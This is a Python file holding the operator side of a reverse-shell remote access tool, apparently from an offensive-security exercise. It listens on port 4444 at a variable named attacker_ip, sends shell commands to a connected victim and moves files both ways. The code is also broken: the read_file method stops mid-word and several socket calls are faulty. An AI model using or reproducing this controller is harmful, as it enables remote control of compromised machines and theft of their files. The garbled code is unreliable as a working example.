import json
import socket 
from base64 import b64decode, b64encode
from socket import AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR

class Listener:
    def __init__(self, ip, port=4444): # controlled
        listener = socket.socket(AF_INET, SOCK_STREAM)
        listener.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print('[+] Waiting for incoming connections ...')

        self.connection, address = listener.accept()
        print(f'[+] New connection from {address}')

    def send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def receive(self):
        json_data = ''
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json_data
            except ValueError:
                continue 
        

    def execute_remote_command(self, command):
        self.send(command)
        return self.receive()
    
    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(b64decode(content))
            return '[+] Download successful.'
    
    def read_file(self, path):
        with open(path, 'rb') as file:
            retu

    def run(self):
        while True:
            command = input('>> ')
            command = command.split(' ')

            if command[0] == 'upload': # ['upload', 'file name'].append('file content as binary')
                file_content = self.read_file(command[1])
                command.append(file_content)



            result = self.execute_remote_command(command)

            if command[0] == 'download':  # ['download', 'file name']
                self.write_file(command[1], result)

            print(result)

attacker_ip = "192.168.106.129"
listener = Listener(attacker_ip, 4444)
listener.run()
